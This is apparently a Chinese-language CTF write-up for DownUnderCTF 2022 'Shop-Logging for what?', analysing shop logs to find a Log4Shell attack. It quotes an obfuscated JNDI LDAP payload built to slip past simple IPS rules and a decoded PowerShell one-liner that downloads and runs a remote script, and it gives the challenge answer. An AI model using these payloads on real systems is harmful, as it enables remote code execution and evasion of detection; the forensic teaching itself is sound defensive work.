# DownUnderCTF 2022 Shop-Logging for what? Writeup

## 题目简述

题目使用 `DownUnderShop.JSON` 中一小时的模拟商店日志，说明基础 IPS 漏过了一次较复杂的攻击，要求找出攻击成功后执行的脚本名称。答案区分大小写，且不采用 `DUCTF{}` 包裹。

日志中出现了多条 Log4Shell/JNDI 探测。多数 User-Agent 是直白的 `${jndi:...}`，真正需要关注的是唯一使用 Log4j lookup 默认值语法拆散关键字、并携带 `Basic/Command/Base64` 载荷的记录。

## 解题过程

先筛选 `useragent` 字段中包含 `jndi`、`${::-` 或 `Base64` 的事件。异常记录来自 `119.17.132.75`，时间为日志中的 `2021-01-01T09:29:13.000+0000`，其核心结构为：

```text
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://
41.108.181.141:5552/Basic/Command/Base64/<base64>}
```

在 Log4j lookup 中，`${name:-x}` 表示查找失败时使用默认值 `x`。这里的查找名为空，所以 `${::-j}`、`${::-n}` 等片段依次还原为字符，完整协议头就是 `jndi:ldap`。这种拆分会绕过只匹配连续 `${jndi:` 的简单规则。

对 URL 最后一段 Base64 解码，得到：

```powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://downunderctf.com/pTCNp5p6LP0d7qA77yvb4SHf40');"
```

不需要也不应访问这个历史下载地址。题目询问的是脚本名称，取 URL 最后一个路径段即可：

```text
pTCNp5p6LP0d7qA77yvb4SHf40
```

## 方法总结

日志调查不能只统计规则命中数，还要比较同类事件的结构差异。此题的识别链是“异常 User-Agent → 还原 Log4j 字符拼接 → 取出 Base64 命令 → 从下载 URL 提取脚本名”。对历史恶意链接应做离线字符串分析，不必再次请求远端资源。
